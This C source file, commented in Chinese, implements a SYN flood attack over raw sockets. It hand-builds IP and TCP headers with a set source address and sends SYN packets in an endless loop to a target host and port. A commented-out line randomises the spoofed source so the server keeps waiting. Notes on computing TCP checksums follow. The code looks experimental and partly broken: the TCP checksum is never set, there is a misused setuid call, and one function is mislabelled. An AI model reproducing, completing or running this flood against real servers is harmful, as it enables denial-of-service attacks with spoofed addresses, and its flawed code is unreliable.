/*
 * 原始套接字实现SYN攻击
 * 一个模拟攻击的程序，就是tcp3次握手时，我们客户端只发送SYN包后进入SYN_SEND状态，
 * 但之后就不管了，然而服务器接收SYN包后会发送ACK和SYN包给我们，进入SYN_RECV状态，
 * 等待我们客户端的ACK包。
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <time.h>
#include <netdb.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip.h>

void attack(int fd, struct sockaddr_in *svaddr, unsigned short srcport);
unsigned short check_sum(unsigned short *addr,int len);

unsigned short my_checksum(const unsigned char *data, int length);


int
main(int argc, char *argv[])
{
	struct sockaddr_in svaddr;
	unsigned short srcport;
	int fd, optval;


	if (argc != 4) {
		fprintf(stderr, "Usage: %s <dsthost> <dstport> <srcport>\n",
			argv[0]);
		exit(-1);
	}


	/* 1 - 创建一个 TCP 原始 socket */
	if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) {
		perror("socket() failed");
		exit(errno);
	}

	/* 2 - 初始化服务器端（对方）的地址和端口信息 */
	memset(&svaddr, 0, sizeof(svaddr));
	svaddr.sin_family = AF_INET;
	svaddr.sin_port = htons(atoi(argv[2]));
	if (inet_pton(AF_INET, argv[1], &(svaddr.sin_addr)) != 1) {
		fprintf(stderr, "inet_pton() convert %s failed: %s\n",
			argv[1], strerror(errno));
		exit(errno);
	}

	optval = 1;
	/* 用模板代码来开启IP_HDRINCL特性，我们完全自己手动构造IP报文 */
	if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval)) == -1) {
		perror("setsockopt() failed: ");
		exit(-1);
	}



	/* 让执行该命令的用户以该命令拥有者的权限去执行 */
	/* 因为只有root用户才可以play with raw socket :) */
	setuid(getpid());
	srcport = atoi(argv[3]);
	attack(fd, &svaddr, srcport);

	return 0;
}




/*
 * TCP 伪首部
 */
struct tcphdr_psd {
	struct in_addr ip_src;	/* 32位源IP */
	struct in_addr ip_dst;	/* 32位目的IP */
	unsigned char mbz;	/* 8位全0保留字 */
	unsigned char ptcl;	/* 8位TCP协议（6，即 0000 0110） */
	unsigned short tcpl;	/* 16位TCP总长度（首部+数据） */
};



/*
 * 在该函数中构造整个IP报文，最后调用sendto函数将报文发送出去
 */
void
attack(int fd, struct sockaddr_in *svaddr, unsigned short srcport)
{
	char buf[128];
	struct ip *ip_head;
	struct tcphdr *tcp_head;
	int ip_len;
	struct tcphdr_psd psd_header;

	memset(buf, 0, sizeof(buf));
	memset(&psd_header, 0, sizeof(psd_header));

	/* TCP的报文中Data没有字段，所以整个IP报文的长度=ip头+tcp头 */
	ip_len = sizeof(struct ip) + sizeof(struct tcphdr);

	/* 开始填充IP首部 */
	ip_head = (struct ip *) buf;

	ip_head->ip_v = IPVERSION;
	ip_head->ip_hl = sizeof(struct ip) >> 2;	/* 这里4*5=20字节 */
	ip_head->ip_tos = 0;
	ip_head->ip_len = htons(ip_len);
	ip_head->ip_id = 0;
	ip_head->ip_off = 0;
	ip_head->ip_ttl = MAXTTL;
	ip_head->ip_p = IPPROTO_TCP;
	ip_head->ip_sum = 0;
	ip_head->ip_dst = svaddr->sin_addr;


	/* 开始填充TCP首部 */
	tcp_head = (struct tcphdr *) (buf + sizeof(struct ip));

	tcp_head->source = htons(srcport);
	tcp_head->dest = svaddr->sin_port;
	tcp_head->seq = random();
	tcp_head->doff = 5;	/* 4字节*5=20字节，TCP首部长度20字节 */
	tcp_head->syn = 1;
	tcp_head->check = 0;


	psd_header.ptcl = 0x06;
	psd_header.tcpl = ip_len - sizeof(struct ip);

	unsigned char tcp_buf[128];
	int i;

	char str4[INET_ADDRSTRLEN];
	srand(time(NULL));

	char *addr1 = "192.168.1.221";
	char recv_buf[128];
	memset(recv_buf, 0, sizeof(recv_buf));
	socklen_t addrlen = sizeof(struct sockaddr_in);
	while (1) {
		/* 源地址伪造，我们随便任意生成个地址，让服务器一直等待下去 */
		//ip_head->ip_src.s_addr = random();
		//printf("sum = %08X\n", my_checksum((unsigned char *) ip_head, sizeof(struct ip)));

		inet_pton(AF_INET, addr1, &(ip_head->ip_src));
		inet_ntop(AF_INET, &(ip_head->ip_src), str4, sizeof(str4));
		printf("ip = %s\n", str4);

	printf("ip header = %d:\n", sizeof(struct ip));
	for (i = 0; i < sizeof(struct ip); ++i) {
		printf("%02X ", (unsigned char) buf[i]);
	}
	printf("\n\n");

		psd_header.ip_src = ip_head->ip_src;
		psd_header.ip_dst = ip_head->ip_dst;

		memset(tcp_buf, 0, sizeof(tcp_buf));
		memcpy(tcp_buf, &psd_header, sizeof(psd_header));
		memcpy(tcp_buf + sizeof(psd_header), tcp_head, sizeof(struct tcphdr));

		/* TCP首部校验和 */
		//tcp_head->check = my_checksum((unsigned char *) tcp_head, sizeof(struct tcphdr));
		//tcp_head->check = my_checksum(tcp_buf, sizeof(struct tcphdr) + sizeof(psd_header));
		sendto(fd, buf, ip_len, 0, (struct sockaddr *) svaddr, sizeof(struct sockaddr_in));

		/* 发送后我们是不是可以使用recvfrom()来接收服务器的SYN+ACK包呢 */
		ssize_t nbytes = recvfrom(fd, recv_buf, sizeof(recv_buf), 0,
			(struct sockaddr *) svaddr, &addrlen);
		printf("recv %d bytes\n", nbytes);



	printf("tcp len = %d\n", sizeof(struct tcphdr));
	for (i = sizeof(struct ip); i < sizeof(struct ip) + sizeof(struct tcphdr); ++i) {
		printf("%02X ", (unsigned char) buf[i]);
	}
	printf("\n\n");

		sleep(3);
	}
}






/*
 * CRC校验和的计算
 */
unsigned short check_sum(unsigned short *addr,int len){
        register int nleft=len;
        register int sum=0;
        register short *w=addr;
        short answer=0;

        while(nleft>1)
        {
                sum+=*w++;
                nleft-=2;
        }
        if(nleft==1)
        {
                *(unsigned char *)(&answer)=*(unsigned char *)w;
                sum+=answer;
        }

        sum=(sum>>16)+(sum&0xffff);
        sum+=(sum>>16);
        answer=~sum;
        return(answer);
}


/*
TCP校验和是一个端到端的校验和，由发送端计算，然后由接收端验证。其目的是为了
发现TCP首部和数据在发送端到接收端之间发生的任何改动。如果接收方检测到校验和
有差错，则TCP段会被直接丢弃。
TCP校验和覆盖TCP首部和TCP数据，而IP首部中的校验和只覆盖IP的首部，不覆盖IP数据报
中的任何数据。
TCP的校验和是必需的，而UDP的校验和是可选的。
TCP和UDP计算校验和时，都要加上一个12字节的伪首部。

伪首部共有12字节，包含如下信息：源IP地址、目的IP地址、保留字节(置0)、
传输层协议号(TCP是6)、TCP报文长度(报头+数据)。
伪首部是为了增加TCP校验和的检错能力：如检查TCP报文是否收错了(目的IP地址)、
传输层协议是否选对了(传输层协议号)等。

首先，把伪首部、TCP报头、TCP数据分为16位的字，如果总长度为奇数个字节，则在最后
增添一个位都为0的字节。把TCP报头中的校验和字段置为0（否则就陷入鸡生蛋还是蛋生鸡
的问题）。
其次，用反码相加法累加所有的16位字（进位也要累加）。
最后，对计算结果取反，作为TCP的校验和。


应该是这样算：
1、  把校验和字段置为0；

2、  对IP头部中的每16bit进行二进制求和；

3、  如果和的高16bit不为0，则将和的高16bit和低16bit反复相加，直到和的高16bit为0，从而获得一个16bit的值；

4、  将该16bit的值取反，存入校验和字段。


TCP 伪首部
32位源IP
32位目的IP
8位全0保留字
8位TCP协议（6，即 0000 0110）
16位TCP总长度（首部+数据）


比如 下面是TCP的头
4E 23 6 8F 36 CA 45 A3 EC 73 CB FB 80 10 1E E8 D0 2A 0 0 

第13个字节是0x80，表示TCP包头长hex(80/4)=32,后面的12个字节是TCP包头的可选项
（可怜我一直以为是TCP的伪包头，实际上TCP的伪包头是不发的，根本就不存在）。

计算TCP的校验和时，有三部分：TCP伪包头+TCP包头+数据。
这条指令没有数据，就只用算两部分，

伪包头自己写，
源IP地址     目的IP地址     置空(0)     协议类型       TCP包的总长度
D3 93 4 CC    C0 A8 1 16    00           06            00 20

源IP地址，目的IP地址，协议类型在IP包头中有，直接移过来， 
TCP包的总长度用IP包中的总长度0x34-IP包的长度0x14(定长20)=0x20。

计算的IP校验正确，计算的IP和TCP校验和wireshark不同的，是因为wireshark不自动做
tcp校验和的检验。
*/

unsigned short my_checksum(const unsigned char *data, int length)
{
	unsigned int sum = 0;
	int i;
	int is_odd = 0;

	if (length % 2 != 0) {
		length -= 1;
		is_odd = 1;
	}
	for (i = 0; i < length; i += 2)
		sum += ((data[i] << 8) + data[i+1]);
	if (is_odd)
		sum += (data[i] << 8);

	while ((sum >> 16) != 0x00)
		sum = (sum & 0xFFFF) + (sum >> 16);

	return ((unsigned short) (~sum));
}


unsigned short checksum_v2(unsigned short *buf, int nword)
{
    unsigned long sum;
 
    for(sum = 0; nword > 0; nword--)
        sum += *buf++;
 
    sum = (sum>>16) + (sum&0xffff);
    sum += (sum>>16);
 
    return ~sum;
}


unsigned short
tcp_check_sum(const unsigned char *ptr, int length)
{
	int i;
/*
	unsigned char data[] = {
		0xC0, 0xA8, 0x01, 0xCD,
		0x6F, 0x0D, 0x64, 0x5C,
		0x00,
		0x06,
		0x00, 0x20,

		0x8C, 0x1B,
		0x01, 0xBB,
		0x6C, 0x54, 0x68, 0x41,
		0xC4, 0x48, 0x53, 0xC8,
		0x50,
		0x10,
		0x00, 0xE5,
		0x00, 0x00,
		0x00, 0x00};
*/

	unsigned char data[] = {
		0xC0, 0xA8, 0x9F, 0x01,
		0xC0, 0xA8, 0x9F, 0x82,
		0x00,
		0x06,
		0x00, 0x17,

		0x04, 0xC6,
		0x87, 0x01,
		0x4B, 0xD7, 0x89, 0x9F,
		0x4E, 0x3B, 0x90, 0xAE,
		0x50,
		0x18,
		0xFF, 0xFF,
		0x00, 0x00,
		0x00, 0x00,
		0x61, 0x62, 0x63};


	length = sizeof(data);

	//exit(1);

	//printf("len = %d\n", length);
	//for (i = 0; i < length; ++i) {
	//	printf("%02X ", data[i]);
	//}
	//printf("\n");


	unsigned int sum = 0;
/*
	for (i = 0; i < length; ++i) {
		if (i % 2 == 0)
			sum += (data[i] << 8);
		else
			sum += data[i];
	}
	printf("sum = %08X\n", sum);

	while ((sum >> 16) != 0x00) {
		sum = (sum & 0xFFFF) + (sum >> 16);
	}
	printf("sum = %08X\n", sum);
*/
	unsigned short cs = my_checksum(data, length);
	printf("cs = %04X\n", cs);
	exit(1);


	return 0;
}
